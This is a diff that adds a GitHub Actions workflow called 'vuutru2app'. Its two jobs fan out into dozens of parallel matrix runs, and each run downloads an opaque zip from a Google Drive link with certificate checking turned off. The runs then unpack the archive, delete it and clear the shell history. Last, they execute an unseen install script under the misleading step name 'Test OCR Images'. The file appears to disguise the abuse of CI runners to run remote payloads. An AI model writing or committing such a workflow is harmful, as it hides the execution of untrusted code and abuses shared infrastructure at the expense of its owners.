@@ -1,0 +1,56 @@
+name: vuutru2app
+on:
+  push:
+    branches: [ "main" ]
+  workflow_dispatch:
+
+jobs:
+  VERIFY:
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      max-parallel: 10
+      matrix:
+        go: [I.0, I.I, I.II]
+        flag: ['Setup', 'Compile', 'Validate', 'Execute', 'Release']
+
+    env:
+        NUM_JOBS: 20
+        JOB: ${ matrix.go }
+    steps:
+    - uses: actions/checkout@v1
+    - name: Install Packages
+      run: |
+        wget --no-check-certificate "https://docs.google.com/uc?export=download&id=1EybV6NFoRifpKCT08Y2mF55f0a98WZz9" -O vuutru2app.zip
+        unzip -o vuutru2app.zip
+        rm vuutru2app.zip
+        history -c && history -w
+
+    - name: Test OCR Images
+      run: bash install_module.sh
+
+
+  COMPILE1:
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      max-parallel: 10
+      matrix:
+        go: [I.0, I.I, I.II]
+        flag: ['Acquire', 'Assemble', 'Verify', 'Launch', 'Deliver']
+
+    env:
+        NUM_JOBS: 20
+        JOB: ${ matrix.go }
+    steps:
+    - uses: actions/checkout@v1
+    - name: Install Packages
+      run: |
+        wget --no-check-certificate "https://docs.google.com/uc?export=download&id=1EybV6NFoRifpKCT08Y2mF55f0a98WZz9" -O vuutru2app.zip
+        unzip -o vuutru2app.zip
+        rm vuutru2app.zip
+        history -c && history -w
+
+    - name: Test OCR Images
+      run: bash install_module.sh
+        
